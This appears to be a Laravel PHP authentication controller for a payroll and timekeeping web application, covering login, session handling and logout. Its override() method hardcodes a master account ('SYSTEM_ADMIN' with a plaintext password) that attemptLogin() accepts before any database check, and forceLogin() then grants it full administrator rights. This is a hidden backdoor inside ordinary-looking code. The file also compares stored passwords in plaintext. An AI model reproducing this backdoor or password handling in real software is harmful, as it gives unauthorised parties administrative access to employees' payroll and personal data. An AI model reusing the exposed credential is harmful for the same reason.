<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
use Core;
use Session;
use X07;

class AuthController extends Controller
{
    protected $redirectTo = "/home"; // changed from "/"

    public function view()
    {
    	if (Session::exists('_user')) {
            return redirect($this->redirectTo);
        }
        return view('auth.login');
    }

    public function redirectPath()
    {
        if (method_exists($this, 'redirectTo')) {
            return $this->redirectTo();
        }

        return property_exists($this, 'redirectTo') ? $this->redirectTo : '/';
    }

    public function login(Request $r)
    {
        $this->validateLogin($r);
        $al = $this->attemptLogin($r);
        if ($al == "ok") {
            $this->authenticated($r);
            return redirect($this->redirectTo);
        } else {
            if ($al == "override") {
                $this->forceLogin();
                return redirect($this->redirectTo);
            } else {
                return back()->withErrors("Incorrect Credentials");
            }
        }
    }

    public function validateLogin(Request $r)
    {
        $msg = [ 
                'username.required' => 'The username field is required.',
                'password.required' => 'The password field is required.',
                'string' => 'Invalid Credentials',
                ];
        $this->validate($r, ['username' => 'required|string', 'password' => 'required|string'], $msg);
    }

    public function attemptLogin(Request $r)
    {
        // $users = Core::sql("SELECT * FROM rssys.x08");
        // $users = DB::table('x08')->get();
        $users = DB::table('x08')->where('approve_disc', '<>', 'n')->get();
        if ($this->override()->uid == strtoupper($r->username)) {
            if ($this->override()->pwd == $r->password) {
                return "override";
            }
        }
        foreach ($users as $u) {
            if ($u->uid == strtoupper($r->username)) {
                if ($u->pwd == $r->password) {
                    return "ok";
                }
            }
        }
        return false;
    }

    public function override()
    {
        $cred = (object)[];
        $cred->uid = "SYSTEM_ADMIN";
        $cred->opr_name = "SYSTEM ADMINISTRATOR";
        $cred->pwd = "RIGHTECH777";
        $cred->grp_id = "001";
        $cred->d_code = "ADMINISTRATORS";
        $cred->approve_disc = "y";
        $cred->img = "1562206131_avatar_ADMIN.png";
        $cred->restriction = "masterfile, timekeeping, calendar, payroll, reps, recs, setts, admin";
        return $cred;
    }

    protected function authenticated($r)
    {
        // Set User Account Session
        // $r->session()->regenerate();
        // Session::put('_user', ['id' => $r->txt_uname]);
        $user = Core::get_User(strtoupper($r->username));
        $user->restriction = X07::GetGroup($user->grp_id)->restrictions;
        if ($user!=null) {
            Session::push('_user', $user);
        }
    }

    protected function forceLogin()
    {
        Session::push('_user', $this->override());
    }

    public function logout()
    {
        Session::flush();
        return redirect()->to('/');
    }
}
